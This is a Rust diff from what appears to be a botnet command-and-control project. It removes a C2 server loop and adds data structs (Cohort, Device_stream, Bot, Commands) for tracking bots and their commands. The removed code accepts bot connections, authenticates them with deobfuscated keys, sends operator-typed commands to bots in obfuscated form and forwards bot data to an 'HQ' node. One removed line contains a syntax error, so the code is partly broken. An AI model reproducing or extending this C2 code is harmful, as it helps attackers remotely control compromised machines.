@@ -1,224 +1,112 @@
 extern crate core;
 use tokio::{
-    io::{AsyncReadExt, AsyncWriteExt, BufReader, Interest, ReadBuf},
-    macros::support::poll_fn,
-    sync::{
-        broadcast,
-        broadcast::Receiver,
-        broadcast::Sender
-    },
-    net::tcp::OwnedWriteHalf,
-    sync::broadcast::error::TryRecvError
+    net::{TcpListener, TcpStream},
 };
 use std::{
-    io,
-    slice,
     net::SocketAddr,
-    process::Command,
-    ptr::slice_from_raw_parts,
-    str::{EscapeDebug, from_utf8},
-    thread,
-    net,
-    future,
-    error::Error,
-    sync::mpsc,
-    future::Future,
-    thread::JoinHandle
 };
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
-use base32;
 
-use crate::{
-    encoder,
-    communication::bot::{Bot, Device_stream},
-    communication::lib,
-    encryption as enc,
-    message as msg,
-};
-use super::bot;
+use crate::communication::lib;
 
-const HQ: &str = "127.0.0.1:6969";
-const LOCAL: &str = "127.0.0.1:6000";
-const MSG_SIZE: usize = 4096;
-const USERNAME_LENGTH: usize = 10;
-const IV_LEN: usize = 16;
-
-async fn handle_message_received(DS: &mut bot::Device_stream, socket: &tokio::net::TcpStream) -> Vec<u8> {
-    let mut buffer = [0; MSG_SIZE];
-    loop {
-        socket.readable().await;
-        match socket.try_read(&mut buffer) {
-            Ok(0) => {
-                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.M.Username).unwrap());
-                DS.connected = false;
-                return vec![];
-            }
-            Ok(recv_bytes) => {
-                println!("Received bytes: {}", recv_bytes);
-            }
-            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
-                // edode : Avoid returning an empty vector (empty Incoming_Message)
-                println!("Error: {}", e);
-                //continue;
-            }
-            Err(e) => {
-                println!("Error: {}", e);
-            }
-        };
-        println!("buffer read : {:?}", buffer);
-        return buffer.to_vec();
-    };
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Cohort {
+    pub authenticated: bool,
+    pub connected: bool,
+    pub encryption_key: Vec<u8>,
+    pub hq_id: Vec<u8>,
+    pub is_hq: bool,
+    pub C2_Stream: Vec<self::Device_stream>,
 }
-
-async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr) -> bot::Device_stream {
-    let mut DS = Device_stream::new(
-        addr,
-        false,
-        true,
-        Vec::new(),
-        bot::Bot::new(Vec::new(), Vec::new())
-    );
-    let data = handle_message_received(&mut DS, socket).await;
-    if DS.connected {
-        let encryption_key = msg::c2_bot_data_processing::deobfuscate_data(data, false, &DS.encryption_key);
-        DS.B = msg::c2_bot_data_processing::deserialize_rmp(encryption_key);
-        DS.encryption_key = DS.B.com.data.clone();
-    }
-    return DS;
-}
-
-async fn handle_message_from_client(
-    mut DS: bot::Device_stream,
-    mut bot_tx: Sender<bot::Device_stream>,
-    mut c2_rx: Receiver<bot::Device_stream>,
-    mut socket: tokio::net::TcpStream,
-) -> io::Result<()> {
-
-    let mut buffer: [u8; 4096] = [0; MSG_SIZE];
-    let mut bf: [u8; 4096] = [0; MSG_SIZE];
-
-    loop {
-        match socket.try_read(&mut buffer) {
-            Ok(n) if n == 0 => {
-                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.B.uid).unwrap());
-                DS.connected = false;
-            },
-            Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
-                let marshaled_data = msg::c2_bot_data_processing::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
-                DS.B = msg::c2_bot_data_processing::deserialize_rmp(marshaled_data);
-                bot_tx.send(DS.clone()).unwrap();
-                buffer
-                    .iter_mut()
-                    .for_each(|x| *x = 0); // reset buffer
-            },
-            Err(ref err) if err.kind() == io::ErrorKind::WouldBlock => {
-                // edode : Avoid returning an empty vector (empty Incoming_Message)
-                //println!("Error: {}", err);
-                //continue; -> removing this allows to listen and to write commands
-            },
-            Err(err) => {
-                println!("Error: {}", err);
-            },
-        };
-        match c2_rx.try_recv() {
-            Ok(DS) => {
-                println!("Sending commands to bots");
-                let obfuscated_data = msg::c2_bot_data_processing::obfuscate_data(msg::c2_bot_data_processing::serialize_rmp(&DS.B), &DS.encryption_key);
-                socket.write(obfuscated_data.as_slice()).await?;
-            },
-            _ => {}
-        };
-    }
-    Ok(())
-}
-
-async fn client_input (
-    c2_tx: Sender<Device_stream>,
-    mut DS: &mut bot::Device_stream,
-) {
-    loop {
-        println!("-> ");
-        let mut buff = String::new();
-        io::stdin()
-            .read_line(&mut buff)
-            .expect("Did not entered a correct string");
-        buff.pop();
-        DS.B.com.command = buff.as_bytes().to_vec();
-
-        c2_tx.send(DS.clone()).unwrap(); // edode : Data has to be sent to the bots
-    }
-}
-
-/// Receiving the data from the bot and sending it to the HQ
-async fn receive_bot_data(
-    mut bot_rx: Receiver<bot::Device_stream>,
-    //hq_tx: TcpStream
-) {
-    loop {
-        match bot_rx.try_recv() {
-            Ok(mut received_data) => {
-                println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
-                println!("Sending Data to Commanding C2");
-                // lisandro : write the code for sending it to HQ
-                //hq_tx.send(received_data);
-            },
-            Err(err) => {
-                // edode : empty channel
-                //println!("Could not receive data : {}", err);
-            },
-        };
-    }
-}
-
-#[tokio::main]
-pub async fn main() -> Result<(), Box<dyn Error>> {
-
-    println!k("Connecting to HQ"); // lisandro : make a function out of it
-    let mut connector = net::TcpStream::connect(HQ);
-    match connector {
-        Ok(mut socket) => {
-            println!("Connected to HQ");
-        },
-        Err(err) => {
-            println!("Could not connect to HQ : {}", err);
+impl Cohort {
+    pub fn new() -> Cohort {
+        Cohort {
+            authenticated: false,
+            connected: false,
+            encryption_key: vec![],
+            hq_id: lib::generate_uid(),
+            is_hq: false,
+            C2_Stream: Vec::new(),
         }
-    };
-
-    let listener = tokio::net::TcpListener::bind(LOCAL).await?;
-    let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
-    let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
-    println!("C2 Server Initialized");
-    loop {
-        // edode : Accepting the new bot
-        let (socket, addr) = listener.accept().await?;
-
-        println!("New user connected: {}", addr);
-        let mut DS: bot::Device_stream = authenticate_new_user(&socket, addr).await;
-
-        if !DS.connected { // edode : if the user could not authenticated, drop the connection
-            drop(DS);
-            continue;
-        }
-        let mut DS_clone = DS.clone();
-
-        let mut bot_rx = chn_bot_tx.subscribe();
-        let bot_tx = chn_bot_tx.clone();
-
-        let mut c2_rx = chn_c2_tx.subscribe();
-        let c2_tx = chn_c2_tx.clone();
-
-        tokio::spawn(async move {
-            handle_message_from_client(DS, bot_tx, c2_rx, socket).await;
-        });
-
-        tokio::spawn(async move {
-            receive_bot_data(bot_rx).await;
-        });
-
-        tokio::spawn(async move {
-            client_input(c2_tx, &mut DS_clone).await;
-        });
     }
-    Ok(())
+    pub fn append_C2_Stream(&mut self, C2_Stream: self::Device_stream) {
+        self.C2_Stream.push(C2_Stream);
+    }
+    pub fn promot_to_hq(&mut self) {
+        self.is_hq = true;
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Device_stream {
+    pub ip_address: std::net::SocketAddr,
+    pub authenticated: bool,
+    pub connected: bool,
+    pub encryption_key: Vec<u8>,
+    pub c2_id: Vec<u8>,
+    pub B: self::Bot,
+}
+impl Device_stream {
+    pub fn new(
+        address: SocketAddr,
+        authenticated: bool,
+        connected: bool,
+        encryption_key: Vec<u8>,
+        B: Bot,
+    ) -> Device_stream {
+        Device_stream {
+            ip_address: address,
+            authenticated: false,
+            connected: true,
+            encryption_key: vec![],
+            c2_id: lib::generate_uid(),
+            B: B,
+        }
+    }
+    pub fn erase_data(&mut self) {
+        //self.sock.shutdown(Shutdown::Both).unwrap();
+        self.B.erase_data();
+    }
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Bot {
+    #[serde(with = "serde_bytes")]
+    pub uid: Vec<u8>,
+    #[serde(with = "serde_bytes")]
+    pub version: Vec<u8>,
+    pub com: self::Commands
+}
+impl Bot {
+    pub fn new(uid: Vec<u8>, version: Vec<u8>) -> Bot {
+        Bot {
+            uid: uid,
+            version: version,
+            com: Commands::new(Vec::new(), Vec::new())
+        }
+    }
+    pub fn erase_data(&mut self) {
+        self.com.erase_data();
+    }
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Commands {
+    #[serde(with = "serde_bytes")]
+    pub command: Vec<u8>,
+    #[serde(with = "serde_bytes")]
+    pub data: Vec<u8>,
+}
+impl Commands {
+    pub fn new(command: Vec<u8>, data: Vec<u8>) -> Commands {
+        Commands {
+            command: command,
+            data: data,
+        }
+    }
+    pub fn erase_data(&mut self) {
+        self.command.clear();
+        self.data.clear();
+    }
 }
